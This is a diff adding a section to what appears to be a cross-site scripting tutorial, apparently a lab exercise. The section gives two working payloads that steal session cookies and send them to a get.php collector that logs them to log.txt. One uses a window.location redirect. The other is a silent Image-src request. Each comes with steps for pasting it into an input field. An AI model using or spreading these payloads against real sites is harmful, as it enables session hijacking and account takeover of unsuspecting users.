@@ -52,4 +52,26 @@ YasserRED> sudo touch log.txt
 
 YasserREED> sudo chmod 777 log.txt
 
+# Send The Cookie to log.txt by get.php using window.location() function:
+
+1- Write The Payload:
+
+<script> window.location='https://127.0.0.1/get.php?cookie='+document.cookie </script> 
+
+2- Paste to input filed.
+
+3- Check log.txt. //if not showen you can refresh the page 🔄
+
+# Take the cookie Silnce by get.php and send it to log.txt:
+
+1- Write Payload:
+
+<script>
+    var o = new Image();
+    o.src="http://127.0.0.1/get.php?cookie="+document.cookie
+</script>
+
+2- Paste in input filed.
+
+3- Check log.txt //if not showen you can refresh the page 🔄
 
